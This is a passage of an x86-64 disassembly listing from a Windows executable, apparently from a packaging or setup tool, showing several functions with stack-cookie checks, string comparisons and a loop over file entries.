   1400034bf:	3d 00 10 00 00       	cmp    $0x1000,%eax
   1400034c4:	0f 8d 21 01 00 00    	jge    0x1400035eb
   1400034ca:	48 8d 8c 24 d0 00 00 	lea    0xd0(%rsp),%rcx
   1400034d1:	00 
   1400034d2:	e8 99 10 00 00       	call   0x140004570
   1400034d7:	83 f8 01             	cmp    $0x1,%eax
   1400034da:	75 3e                	jne    0x14000351a
   1400034dc:	48 8b 8d 18 20 00 00 	mov    0x2018(%rbp),%rcx
   1400034e3:	48 85 c9             	test   %rcx,%rcx
   1400034e6:	74 11                	je     0x1400034f9
   1400034e8:	48 8b d6             	mov    %rsi,%rdx
   1400034eb:	e8 30 3c 00 00       	call   0x140007120
   1400034f0:	83 f8 01             	cmp    $0x1,%eax
   1400034f3:	0f 84 b3 00 00 00    	je     0x1400035ac
   1400034f9:	48 8d 94 24 d0 00 00 	lea    0xd0(%rsp),%rdx
   140003500:	00 
   140003501:	48 8d 0d b0 98 02 00 	lea    0x298b0(%rip),%rcx        # 0x14002cdb8
   140003508:	44 38 b5 31 30 00 00 	cmp    %r14b,0x3031(%rbp)
   14000350f:	0f 85 b4 00 00 00    	jne    0x1400035c9
   140003515:	e8 36 f5 ff ff       	call   0x140002a50
   14000351a:	4c 8b c6             	mov    %rsi,%r8
   14000351d:	48 8d 95 22 20 00 00 	lea    0x2022(%rbp),%rdx
   140003524:	48 8b cd             	mov    %rbp,%rcx
   140003527:	e8 f4 48 00 00       	call   0x140007e20
   14000352c:	85 c0                	test   %eax,%eax
   14000352e:	0f 88 ae 00 00 00    	js     0x1400035e2
   140003534:	80 7f 11 64          	cmpb   $0x64,0x11(%rdi)
   140003538:	75 59                	jne    0x140003593
   14000353a:	48 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%rax
   140003541:	00 
   140003542:	48 8b cd             	mov    %rbp,%rcx
   140003545:	4c 8d 8c 24 d0 10 00 	lea    0x10d0(%rsp),%r9
   14000354c:	00 
   14000354d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003552:	4c 8d 84 24 d0 20 00 	lea    0x20d0(%rsp),%r8
   140003559:	00 
   14000355a:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   14000355f:	e8 3c 0c 00 00       	call   0x1400041a0
   140003564:	eb 40                	jmp    0x1400035a6
   140003566:	4c 8d 47 12          	lea    0x12(%rdi),%r8
   14000356a:	48 8d 94 24 d0 10 00 	lea    0x10d0(%rsp),%rdx
   140003571:	00 
   140003572:	48 8d 8c 24 d0 20 00 	lea    0x20d0(%rsp),%rcx
   140003579:	00 
   14000357a:	e8 e1 0e 00 00       	call   0x140004460
   14000357f:	41 3b c4             	cmp    %r12d,%eax
   140003582:	48 8d b4 24 d0 10 00 	lea    0x10d0(%rsp),%rsi
   140003589:	00 
   14000358a:	41 0f 44 dc          	cmove  %r12d,%ebx
   14000358e:	e9 e3 fe ff ff       	jmp    0x140003476
   140003593:	4c 8d 84 24 d0 00 00 	lea    0xd0(%rsp),%r8
   14000359a:	00 
   14000359b:	48 8b d7             	mov    %rdi,%rdx
   14000359e:	49 8b cd             	mov    %r13,%rcx
   1400035a1:	e8 5a e0 ff ff       	call   0x140001600
   1400035a6:	8b d8                	mov    %eax,%ebx
   1400035a8:	85 c0                	test   %eax,%eax
   1400035aa:	75 24                	jne    0x1400035d0
   1400035ac:	48 8b d7             	mov    %rdi,%rdx
   1400035af:	49 8b cd             	mov    %r13,%rcx
   1400035b2:	e8 89 e3 ff ff       	call   0x140001940
   1400035b7:	48 8b f8             	mov    %rax,%rdi
   1400035ba:	49 3b 85 10 10 00 00 	cmp    0x1010(%r13),%rax
   1400035c1:	0f 82 89 fe ff ff    	jb     0x140003450
   1400035c7:	eb 31                	jmp    0x1400035fa
   1400035c9:	e8 42 f1 ff ff       	call   0x140002710
   1400035ce:	eb 27                	jmp    0x1400035f7
   1400035d0:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   1400035d4:	48 8d 0d 35 98 02 00 	lea    0x29835(%rip),%rcx        # 0x14002ce10
   1400035db:	e8 30 f1 ff ff       	call   0x140002710
   1400035e0:	eb 18                	jmp    0x1400035fa
   1400035e2:	48 8d 0d f7 97 02 00 	lea    0x297f7(%rip),%rcx        # 0x14002cde0
   1400035e9:	eb 07                	jmp    0x1400035f2
   1400035eb:	48 8d 0d 8e 97 02 00 	lea    0x2978e(%rip),%rcx        # 0x14002cd80
   1400035f2:	e8 19 f1 ff ff       	call   0x140002710
   1400035f7:	41 8b dc             	mov    %r12d,%ebx
   1400035fa:	48 8b b4 24 20 31 00 	mov    0x3120(%rsp),%rsi
   140003601:	00 
   140003602:	4c 8b bc 24 e0 30 00 	mov    0x30e0(%rsp),%r15
   140003609:	00 
   14000360a:	4c 8b a4 24 f0 30 00 	mov    0x30f0(%rsp),%r12
   140003611:	00 
   140003612:	4c 8b ac 24 e8 30 00 	mov    0x30e8(%rsp),%r13
   140003619:	00 
   14000361a:	48 8b bc 24 28 31 00 	mov    0x3128(%rsp),%rdi
   140003621:	00 
   140003622:	48 8b ac 24 18 31 00 	mov    0x3118(%rsp),%rbp
   140003629:	00 
   14000362a:	4c 39 74 24 30       	cmp    %r14,0x30(%rsp)
   14000362f:	74 21                	je     0x140003652
   140003631:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140003636:	48 8b c8             	mov    %rax,%rcx
   140003639:	e8 c2 e2 ff ff       	call   0x140001900
   14000363e:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140003643:	4d 8d 76 01          	lea    0x1(%r14),%r14
   140003647:	4a 83 3c f0 00       	cmpq   $0x0,(%rax,%r14,8)
   14000364c:	4a 8d 04 f0          	lea    (%rax,%r14,8),%rax
   140003650:	75 e4                	jne    0x140003636
   140003652:	8b c3                	mov    %ebx,%eax
   140003654:	48 8b 8c 24 d0 30 00 	mov    0x30d0(%rsp),%rcx
   14000365b:	00 
   14000365c:	48 33 cc             	xor    %rsp,%rcx
   14000365f:	e8 6c 8f 00 00       	call   0x14000c5d0
   140003664:	48 81 c4 f8 30 00 00 	add    $0x30f8,%rsp
   14000366b:	41 5e                	pop    %r14
   14000366d:	5b                   	pop    %rbx
   14000366e:	c3                   	ret
   14000366f:	cc                   	int3
   140003670:	40 53                	rex push %rbx
   140003672:	48 83 ec 20          	sub    $0x20,%rsp
   140003676:	48 8b d9             	mov    %rcx,%rbx
   140003679:	e8 92 29 00 00       	call   0x140006010
   14000367e:	48 8b 8b 28 30 00 00 	mov    0x3028(%rbx),%rcx
   140003685:	48 85 c9             	test   %rcx,%rcx
   140003688:	74 10                	je     0x14000369a
   14000368a:	e8 d1 59 00 00       	call   0x140009060
   14000368f:	48 c7 83 28 30 00 00 	movq   $0x0,0x3028(%rbx)
   140003696:	00 00 00 00 
   14000369a:	48 83 c4 20          	add    $0x20,%rsp
   14000369e:	5b                   	pop    %rbx
   14000369f:	c3                   	ret
   1400036a0:	c2 00 00             	ret    $0x0
   1400036a3:	cc                   	int3
   1400036a4:	cc                   	int3
   1400036a5:	cc                   	int3
   1400036a6:	cc                   	int3
   1400036a7:	cc                   	int3
   1400036a8:	cc                   	int3
   1400036a9:	cc                   	int3
   1400036aa:	cc                   	int3
   1400036ab:	cc                   	int3
   1400036ac:	cc                   	int3
   1400036ad:	cc                   	int3
   1400036ae:	cc                   	int3
   1400036af:	cc                   	int3
   1400036b0:	40 53                	rex push %rbx
   1400036b2:	b8 30 40 00 00       	mov    $0x4030,%eax
   1400036b7:	e8 14 92 00 00       	call   0x14000c8d0
   1400036bc:	48 2b e0             	sub    %rax,%rsp
   1400036bf:	48 8b 05 7a b9 03 00 	mov    0x3b97a(%rip),%rax        # 0x14003f040
   1400036c6:	48 33 c4             	xor    %rsp,%rax
   1400036c9:	48 89 84 24 20 40 00 	mov    %rax,0x4020(%rsp)
   1400036d0:	00 
   1400036d1:	48 8b d9             	mov    %rcx,%rbx
   1400036d4:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400036d9:	33 c9                	xor    %ecx,%ecx
   1400036db:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   1400036e1:	ff 15 f1 89 02 00    	call   *0x289f1(%rip)        # 0x14002c0d8
   1400036e7:	85 c0                	test   %eax,%eax
   1400036e9:	75 25                	jne    0x140003710
   1400036eb:	ff 15 df 89 02 00    	call   *0x289df(%rip)        # 0x14002c0d0
   1400036f1:	8b d0                	mov    %eax,%edx
   1400036f3:	4c 8d 05 86 9c 02 00 	lea    0x29c86(%rip),%r8        # 0x14002d380
   1400036fa:	48 8d 0d c7 9c 02 00 	lea    0x29cc7(%rip),%rcx        # 0x14002d3c8
   140003701:	e8 4a f5 ff ff       	call   0x140002c50
   140003706:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000370b:	e9 95 00 00 00       	jmp    0x1400037a5
   140003710:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140003715:	e8 e6 5b 00 00       	call   0x140009300
   14000371a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   14000371f:	85 c0                	test   %eax,%eax
   140003721:	74 5a                	je     0x14000377d
   140003723:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   14000372a:	00 
   14000372b:	e8 50 5c 00 00       	call   0x140009380
   140003730:	85 c0                	test   %eax,%eax
   140003732:	79 18                	jns    0x14000374c
   140003734:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003739:	48 8d 0d b0 9c 02 00 	lea    0x29cb0(%rip),%rcx        # 0x14002d3f0
   140003740:	e8 cb f0 ff ff       	call   0x140002810
   140003745:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   14000374a:	eb 59                	jmp    0x1400037a5
   14000374c:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140003752:	48 8d 94 24 20 20 00 	lea    0x2020(%rsp),%rdx
   140003759:	00 
   14000375a:	48 8d 0d ef 9c 02 00 	lea    0x29cef(%rip),%rcx        # 0x14002d450
   140003761:	e8 6e 1d 01 00       	call   0x1400154d4
   140003766:	33 d2                	xor    %edx,%edx
   140003768:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000376d:	85 c0                	test   %eax,%eax
   14000376f:	48 8d 84 24 20 20 00 	lea    0x2020(%rsp),%rax
   140003776:	00 
   140003777:	0f 45 ca             	cmovne %edx,%ecx
   14000377a:	48 03 c8             	add    %rax,%rcx
   14000377d:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140003783:	48 8b d3             	mov    %rbx,%rdx
   140003786:	e8 35 5d 00 00       	call   0x1400094c0
   14000378b:	48 85 c0             	test   %rax,%rax
   14000378e:	75 13                	jne    0x1400037a3
   140003790:	48 8d 0d c9 9c 02 00 	lea    0x29cc9(%rip),%rcx        # 0x14002d460
   140003797:	e8 74 f0 ff ff       	call   0x140002810
   14000379c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   1400037a1:	eb 02                	jmp    0x1400037a5
   1400037a3:	33 c0                	xor    %eax,%eax
   1400037a5:	48 8b 8c 24 20 40 00 	mov    0x4020(%rsp),%rcx
   1400037ac:	00 
   1400037ad:	48 33 cc             	xor    %rsp,%rcx
   1400037b0:	e8 1b 8e 00 00       	call   0x14000c5d0
   1400037b5:	48 81 c4 30 40 00 00 	add    $0x4030,%rsp
   1400037bc:	5b                   	pop    %rbx
   1400037bd:	c3                   	ret
   1400037be:	cc                   	int3
   1400037bf:	cc                   	int3
   1400037c0:	40 57                	rex push %rdi
   1400037c2:	41 54                	push   %r12
   1400037c4:	41 56                	push   %r14
   1400037c6:	b8 80 20 00 00       	mov    $0x2080,%eax
   1400037cb:	e8 00 91 00 00       	call   0x14000c8d0
   1400037d0:	48 2b e0             	sub    %rax,%rsp
   1400037d3:	48 8b 05 66 b8 03 00 	mov    0x3b866(%rip),%rax        # 0x14003f040
   1400037da:	48 33 c4             	xor    %rsp,%rax
   1400037dd:	48 89 84 24 60 20 00 	mov    %rax,0x2060(%rsp)
   1400037e4:	00 
   1400037e5:	48 8b f9             	mov    %rcx,%rdi
   1400037e8:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400037ed:	e8 2e 1e 01 00       	call   0x140015620
   1400037f2:	48 8b c8             	mov    %rax,%rcx
   1400037f5:	33 d2                	xor    %edx,%edx
   1400037f7:	e8 b8 1e 01 00       	call   0x1400156b4
   1400037fc:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140003800:	e8 ab fe ff ff       	call   0x1400036b0
   140003805:	85 c0                	test   %eax,%eax
   140003807:	79 0c                	jns    0x140003815
   140003809:	48 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%rax
   140003810:	e9 8b 04 00 00       	jmp    0x140003ca0
   140003815:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140003819:	48 89 9c 24 a8 20 00 	mov    %rbx,0x20a8(%rsp)
   140003820:	00 
   140003821:	e8 2a e1 ff ff       	call   0x140001950
   140003826:	48 89 87 10 20 00 00 	mov    %rax,0x2010(%rdi)
   14000382d:	49 c7 c6 ff ff ff ff 	mov    $0xffffffffffffffff,%r14
   140003834:	48 85 c0             	test   %rax,%rax
   140003837:	0f 84 de 00 00 00    	je     0x14000391b
   14000383d:	48 8d 9f 10 10 00 00 	lea    0x1010(%rdi),%rbx
   140003844:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003849:	48 8b cb             	mov    %rbx,%rcx
   14000384c:	4c 8d 4f 10          	lea    0x10(%rdi),%r9
   140003850:	4c 8d 05 35 92 02 00 	lea    0x29235(%rip),%r8        # 0x14002ca8c
   140003857:	e8 24 e4 ff ff       	call   0x140001c80
   14000385c:	48 8b 87 10 20 00 00 	mov    0x2010(%rdi),%rax
   140003863:	48 89 ac 24 b0 20 00 	mov    %rbp,0x20b0(%rsp)
   14000386a:	00 
   14000386b:	48 89 b4 24 b8 20 00 	mov    %rsi,0x20b8(%rsp)
   140003872:	00 
   140003873:	40 32 f6             	xor    %sil,%sil
   140003876:	0f b6 88 18 10 00 00 	movzbl 0x1018(%rax),%ecx
   14000387d:	88 8f 20 20 00 00    	mov    %cl,0x2020(%rdi)
   140003883:	48 8d 0d 16 97 02 00 	lea    0x29716(%rip),%rcx        # 0x14002cfa0
   14000388a:	e8 a1 51 00 00       	call   0x140008a30
   14000388f:	48 8b e8             	mov    %rax,%rbp
   140003892:	b9 31 00 00 00       	mov    $0x31,%ecx
   140003897:	33 c0                	xor    %eax,%eax
   140003899:	48 85 ed             	test   %rbp,%rbp
   14000389c:	74 23                	je     0x1400038c1
   14000389e:	0f b6 75 00          	movzbl 0x0(%rbp),%esi
   1400038a2:	2b f1                	sub    %ecx,%esi
   1400038a4:	75 09                	jne    0x1400038af
   1400038a6:	0f b6 75 01          	movzbl 0x1(%rbp),%esi
   1400038aa:	0f b6 c0             	movzbl %al,%eax
   1400038ad:	2b f0                	sub    %eax,%esi
   1400038af:	48 8d 0d ea 96 02 00 	lea    0x296ea(%rip),%rcx        # 0x14002cfa0
   1400038b6:	e8 e5 52 00 00       	call   0x140008ba0
   1400038bb:	85 f6                	test   %esi,%esi
   1400038bd:	40 0f 94 c6          	sete   %sil
   1400038c1:	48 8b cd             	mov    %rbp,%rcx
   1400038c4:	e8 37 19 01 00       	call   0x140015200
   1400038c9:	40 84 f6             	test   %sil,%sil
   1400038cc:	0f 85 2b 01 00 00    	jne    0x1400039fd
   1400038d2:	48 8d 0d ef 96 02 00 	lea    0x296ef(%rip),%rcx        # 0x14002cfc8
   1400038d9:	e8 52 51 00 00       	call   0x140008a30
   1400038de:	48 85 c0             	test   %rax,%rax
   1400038e1:	0f 84 0e 01 00 00    	je     0x1400039f5
   1400038e7:	4c 8b c8             	mov    %rax,%r9
   1400038ea:	48 8b cb             	mov    %rbx,%rcx
   1400038ed:	4c 2b cb             	sub    %rbx,%r9
   1400038f0:	44 0f b6 01          	movzbl (%rcx),%r8d
   1400038f4:	42 0f b6 14 09       	movzbl (%rcx,%r9,1),%edx
   1400038f9:	44 2b c2             	sub    %edx,%r8d
   1400038fc:	75 07                	jne    0x140003905
   1400038fe:	48 ff c1             	inc    %rcx
   140003901:	85 d2                	test   %edx,%edx
   140003903:	75 eb                	jne    0x1400038f0
   140003905:	45 85 c0             	test   %r8d,%r8d
   140003908:	0f 85 e7 00 00 00    	jne    0x1400039f5
   14000390e:	48 8b c8             	mov    %rax,%rcx
   140003911:	e8 ea 18 01 00       	call   0x140015200
   140003916:	e9 15 01 00 00       	jmp    0x140003a30
   14000391b:	48 8d 15 b2 8f 02 00 	lea    0x28fb2(%rip),%rdx        # 0x14002c8d4
   140003922:	48 8d 4f 10          	lea    0x10(%rdi),%rcx
   140003926:	e8 a5 0c 00 00       	call   0x1400045d0
   14000392b:	48 8b d8             	mov    %rax,%rbx
   14000392e:	48 85 c0             	test   %rax,%rax
   140003931:	74 37                	je     0x14000396a
   140003933:	48 8b 0d 4e ac 02 00 	mov    0x2ac4e(%rip),%rcx        # 0x14002e588
   14000393a:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000393f:	48 89 4c 24 50       	mov    %rcx,0x50(%rsp)
   140003944:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   14000394a:	48 c1 e9 18          	shr    $0x18,%rcx
   14000394e:	80 c1 0d             	add    $0xd,%cl
   140003951:	88 4c 24 53          	mov    %cl,0x53(%rsp)
   140003955:	48 8b c8             	mov    %rax,%rcx
   140003958:	e8 33 46 00 00       	call   0x140007f90
   14000395d:	48 85 c0             	test   %rax,%rax
   140003960:	75 23                	jne    0x140003985
   140003962:	48 8b cb             	mov    %rbx,%rcx
   140003965:	e8 62 c7 00 00       	call   0x1400100cc
   14000396a:	48 8d 5f 10          	lea    0x10(%rdi),%rbx
   14000396e:	48 8b d3             	mov    %rbx,%rdx
   140003971:	48 8d 0d 48 9b 02 00 	lea    0x29b48(%rip),%rcx        # 0x14002d4c0
   140003978:	e8 93 ed ff ff       	call   0x140002710
   14000397d:	41 8b c6             	mov    %r14d,%eax
   140003980:	e9 13 03 00 00       	jmp    0x140003c98
   140003985:	48 8d 9f 10 10 00 00 	lea    0x1010(%rdi),%rbx
   14000398c:	ba 00 10 00 00       	mov    $0x1000,%edx
   140003991:	48 8b cb             	mov    %rbx,%rcx
   140003994:	4c 8d 4f 10          	lea    0x10(%rdi),%r9
   140003998:	4c 8d 05 ed 90 02 00 	lea    0x290ed(%rip),%r8        # 0x14002ca8c
   14000399f:	e8 dc e2 ff ff       	call   0x140001c80
   1400039a4:	49 8b c6             	mov    %r14,%rax
   1400039a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   1400039ae:	00 00 
   1400039b0:	80 7c 03 01 00       	cmpb   $0x0,0x1(%rbx,%rax,1)
   1400039b5:	48 8d 40 01          	lea    0x1(%rax),%rax
   1400039b9:	75 f5                	jne    0x1400039b0
   1400039bb:	48 8b cb             	mov    %rbx,%rcx
   1400039be:	c7 84 07 0d 10 00 00 	movl   $0x676b70,0x100d(%rdi,%rax,1)
   1400039c5:	70 6b 67 00 
   1400039c9:	e8 82 df ff ff       	call   0x140001950
   1400039ce:	48 89 87 10 20 00 00 	mov    %rax,0x2010(%rdi)
   1400039d5:	48 85 c0             	test   %rax,%rax
   1400039d8:	0f 85 7e fe ff ff    	jne    0x14000385c
   1400039de:	48 8d 0d 2b 9b 02 00 	lea    0x29b2b(%rip),%rcx        # 0x14002d510
   1400039e5:	48 8b d3             	mov    %rbx,%rdx
   1400039e8:	e8 23 ed ff ff       	call   0x140002710
   1400039ed:	41 8b c6             	mov    %r14d,%eax
   1400039f0:	e9 a3 02 00 00       	jmp    0x140003c98
   1400039f5:	48 8b c8             	mov    %rax,%rcx
   1400039f8:	e8 03 18 01 00       	call   0x140015200
   1400039fd:	48 8b d3             	mov    %rbx,%rdx
   140003a00:	48 8d 0d c1 95 02 00 	lea    0x295c1(%rip),%rcx        # 0x14002cfc8
   140003a07:	e8 34 51 00 00       	call   0x140008b40
   140003a0c:	48 8d 0d cd 95 02 00 	lea    0x295cd(%rip),%rcx        # 0x14002cfe0
   140003a13:	e8 88 51 00 00       	call   0x140008ba0
   140003a18:	48 8d 0d e1 95 02 00 	lea    0x295e1(%rip),%rcx        # 0x14002d000
   140003a1f:	e8 7c 51 00 00       	call   0x140008ba0
   140003a24:	48 8d 0d f5 95 02 00 	lea    0x295f5(%rip),%rcx        # 0x14002d020
   140003a2b:	e8 70 51 00 00       	call   0x140008ba0
   140003a30:	48 8d 0d c9 95 02 00 	lea    0x295c9(%rip),%rcx        # 0x14002d000
   140003a37:	4c 89 bc 24 70 20 00 	mov    %r15,0x2070(%rsp)
   140003a3e:	00 
   140003a3f:	e8 ec 4f 00 00       	call   0x140008a30
   140003a44:	48 85 c0             	test   %rax,%rax
   140003a47:	0f 84 03 01 00 00    	je     0x140003b50
   140003a4d:	80 38 00             	cmpb   $0x0,(%rax)
   140003a50:	0f 84 fa 00 00 00    	je     0x140003b50
   140003a56:	80 38 30             	cmpb   $0x30,(%rax)
   140003a59:	0f 85 bf 00 00 00    	jne    0x140003b1e
   140003a5f:	80 78 01 00          	cmpb   $0x0,0x1(%rax)
   140003a63:	0f 85 b5 00 00 00    	jne    0x140003b1e
   140003a69:	4c 8d bf 21 20 00 00 	lea    0x2021(%rdi),%r15
   140003a70:	41 c6 07 01          	movb   $0x1,(%r15)
   140003a74:	48 8b c8             	mov    %rax,%rcx
   140003a77:	4c 89 ac 24 78 20 00 	mov    %r13,0x2078(%rsp)
   140003a7e:	00 
   140003a7f:	e8 7c 17 01 00       	call   0x140015200
   140003a84:	41 0f b6 07          	movzbl (%r15),%eax
   140003a88:	4c 8d 2d a1 95 02 00 	lea    0x295a1(%rip),%r13        # 0x14002d030
   140003a8f:	3c 02                	cmp    $0x2,%al
   140003a91:	73 19                	jae    0x140003aac
   140003a93:	84 c0                	test   %al,%al
   140003a95:	48 8d 15 24 95 02 00 	lea    0x29524(%rip),%rdx        # 0x14002cfc0
   140003a9c:	48 8d 0d 5d 95 02 00 	lea    0x2955d(%rip),%rcx        # 0x14002d000
   140003aa3:	49 0f 44 d5          	cmove  %r13,%rdx
   140003aa7:	e8 94 50 00 00       	call   0x140008b40
   140003aac:	48 8b af 10 20 00 00 	mov    0x2010(%rdi),%rbp
   140003ab3:	48 8b 9d 08 10 00 00 	mov    0x1008(%rbp),%rbx
   140003aba:	48 3b 9d 10 10 00 00 	cmp    0x1010(%rbp),%rbx
   140003ac1:	0f 83 2c 01 00 00    	jae    0x140003bf3
   140003ac7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003ace:	00 00 
   140003ad0:	80 7b 11 6f          	cmpb   $0x6f,0x11(%rbx)
   140003ad4:	0f 85 fe 00 00 00    	jne    0x140003bd8
   140003ada:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   140003ae0:	48 8d 15 f9 96 02 00 	lea    0x296f9(%rip),%rdx        # 0x14002d1e0
   140003ae7:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003aeb:	e8 30 71 02 00       	call   0x14002ac20
   140003af0:	85 c0                	test   %eax,%eax
   140003af2:	75 79                	jne    0x140003b6d
   140003af4:	48 8d 4b 22          	lea    0x22(%rbx),%rcx
   140003af8:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   140003afe:	48 8d 15 eb 96 02 00 	lea    0x296eb(%rip),%rdx        # 0x14002d1f0
   140003b05:	e8 16 71 02 00       	call   0x14002ac20
   140003b0a:	85 c0                	test   %eax,%eax
   140003b0c:	0f 85 c6 00 00 00    	jne    0x140003bd8
   140003b12:	c6 87 79 30 00 00 01 	movb   $0x1,0x3079(%rdi)
   140003b19:	e9 ba 00 00 00       	jmp    0x140003bd8
   140003b1e:	80 38 31             	cmpb   $0x31,(%rax)
   140003b21:	75 16                	jne    0x140003b39
   140003b23:	80 78 01 00          	cmpb   $0x0,0x1(%rax)
   140003b27:	75 10                	jne    0x140003b39
   140003b29:	4c 8d bf 21 20 00 00 	lea    0x2021(%rdi),%r15
   140003b30:	41 c6 07 02          	movb   $0x2,(%r15)
   140003b34:	e9 3b ff ff ff       	jmp    0x140003a74
   140003b39:	48 8b d0             	mov    %rax,%rdx
   140003b3c:	48 8d 0d f5 94 02 00 	lea    0x294f5(%rip),%rcx        # 0x14002d038
   140003b43:	e8 c8 eb ff ff       	call   0x140002710
   140003b48:	41 8b c6             	mov    %r14d,%eax
   140003b4b:	e9 30 01 00 00       	jmp    0x140003c80
   140003b50:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003b57:	4c 8d bf 21 20 00 00 	lea    0x2021(%rdi),%r15
   140003b5e:	0f 84 0c ff ff ff    	je     0x140003a70
   140003b64:	41 c6 07 00          	movb   $0x0,(%r15)
   140003b68:	e9 07 ff ff ff       	jmp    0x140003a74
   140003b6d:	41 b8 12 00 00 00    	mov    $0x12,%r8d
   140003b73:	48 8d 15 86 96 02 00 	lea    0x29686(%rip),%rdx        # 0x14002d200
   140003b7a:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003b7e:	e8 9d 70 02 00       	call   0x14002ac20
   140003b83:	85 c0                	test   %eax,%eax
   140003b85:	75 0b                	jne    0x140003b92
   140003b87:	48 8d 43 25          	lea    0x25(%rbx),%rax
   140003b8b:	48 89 87 68 30 00 00 	mov    %rax,0x3068(%rdi)
   140003b92:	41 b8 16 00 00 00    	mov    $0x16,%r8d
   140003b98:	48 8d 15 79 96 02 00 	lea    0x29679(%rip),%rdx        # 0x14002d218
   140003b9f:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003ba3:	e8 78 70 02 00       	call   0x14002ac20
   140003ba8:	85 c0                	test   %eax,%eax
   140003baa:	75 0b                	jne    0x140003bb7
   140003bac:	48 8d 43 29          	lea    0x29(%rbx),%rax
   140003bb0:	48 89 87 70 30 00 00 	mov    %rax,0x3070(%rdi)
   140003bb7:	41 b8 1e 00 00 00    	mov    $0x1e,%r8d
   140003bbd:	48 8d 15 6c 96 02 00 	lea    0x2966c(%rip),%rdx        # 0x14002d230
   140003bc4:	48 8d 4b 12          	lea    0x12(%rbx),%rcx
   140003bc8:	e8 53 70 02 00       	call   0x14002ac20
   140003bcd:	85 c0                	test   %eax,%eax
   140003bcf:	75 07                	jne    0x140003bd8
   140003bd1:	c6 87 78 30 00 00 01 	movb   $0x1,0x3078(%rdi)
   140003bd8:	48 8b d3             	mov    %rbx,%rdx
   140003bdb:	48 8b cd             	mov    %rbp,%rcx
   140003bde:	e8 5d dd ff ff       	call   0x140001940
   140003be3:	48 8b d8             	mov    %rax,%rbx
   140003be6:	48 3b 85 10 10 00 00 	cmp    0x1010(%rbp),%rax
   140003bed:	0f 82 dd fe ff ff    	jb     0x140003ad0
   140003bf3:	48 8d 0d 6e 94 02 00 	lea    0x2946e(%rip),%rcx        # 0x14002d068
   140003bfa:	e8 31 4e 00 00       	call   0x140008a30
   140003bff:	4c 8b c0             	mov    %rax,%r8
   140003c02:	48 85 c0             	test   %rax,%rax
   140003c05:	74 30                	je     0x140003c37
   140003c07:	0f b6 10             	movzbl (%rax),%edx
   140003c0a:	83 ea 30             	sub    $0x30,%edx
   140003c0d:	75 19                	jne    0x140003c28
   140003c0f:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   140003c13:	33 f6                	xor    %esi,%esi
   140003c15:	40 0f b6 ce          	movzbl %sil,%ecx
   140003c19:	2b d1                	sub    %ecx,%edx
   140003c1b:	85 d2                	test   %edx,%edx
   140003c1d:	0f 95 c0             	setne  %al
   140003c20:	88 87 31 30 00 00    	mov    %al,0x3031(%rdi)
   140003c26:	eb 11                	jmp    0x140003c39
   140003c28:	33 f6                	xor    %esi,%esi
   140003c2a:	85 d2                	test   %edx,%edx
   140003c2c:	0f 95 c0             	setne  %al
   140003c2f:	88 87 31 30 00 00    	mov    %al,0x3031(%rdi)
   140003c35:	eb 02                	jmp    0x140003c39
   140003c37:	33 f6                	xor    %esi,%esi
   140003c39:	49 8b c8             	mov    %r8,%rcx
   140003c3c:	e8 bf 15 01 00       	call   0x140015200
   140003c41:	80 bf 20 20 00 00 00 	cmpb   $0x0,0x2020(%rdi)
   140003c48:	0f 84 fd 00 00 00    	je     0x140003d4b
   140003c4e:	41 80 3f 00          	cmpb   $0x0,(%r15)
   140003c52:	0f 85 86 00 00 00    	jne    0x140003cde
   140003c58:	e8 93 54 00 00       	call   0x1400090f0
   140003c5d:	48 89 87 38 30 00 00 	mov    %rax,0x3038(%rdi)
   140003c64:	48 85 c0             	test   %rax,%rax
   140003c67:	75 54                	jne    0x140003cbd
   140003c69:	48 8d 0d 20 94 02 00 	lea    0x29420(%rip),%rcx        # 0x14002d090
   140003c70:	e8 9b ea ff ff       	call   0x140002710
   140003c75:	41 8b c6             	mov    %r14d,%eax
   140003c78:	4c 8b ac 24 78 20 00 	mov    0x2078(%rsp),%r13
   140003c7f:	00 
   140003c80:	4c 8b bc 24 70 20 00 	mov    0x2070(%rsp),%r15
   140003c87:	00 
   140003c88:	48 8b ac 24 b0 20 00 	mov    0x20b0(%rsp),%rbp
   140003c8f:	00 
   140003c90:	48 8b b4 24 b8 20 00 	mov    0x20b8(%rsp),%rsi
   140003c97:	00 
   140003c98:	48 8b 9c 24 a8 20 00 	mov    0x20a8(%rsp),%rbx
   140003c9f:	00 
   140003ca0:	48 8b 8c 24 60 20 00 	mov    0x2060(%rsp),%rcx
   140003ca7:	00 
   140003ca8:	48 33 cc             	xor    %rsp,%rcx
   140003cab:	e8 20 89 00 00       	call   0x14000c5d0
   140003cb0:	48 81 c4 80 20 00 00 	add    $0x2080,%rsp
   140003cb7:	41 5e                	pop    %r14
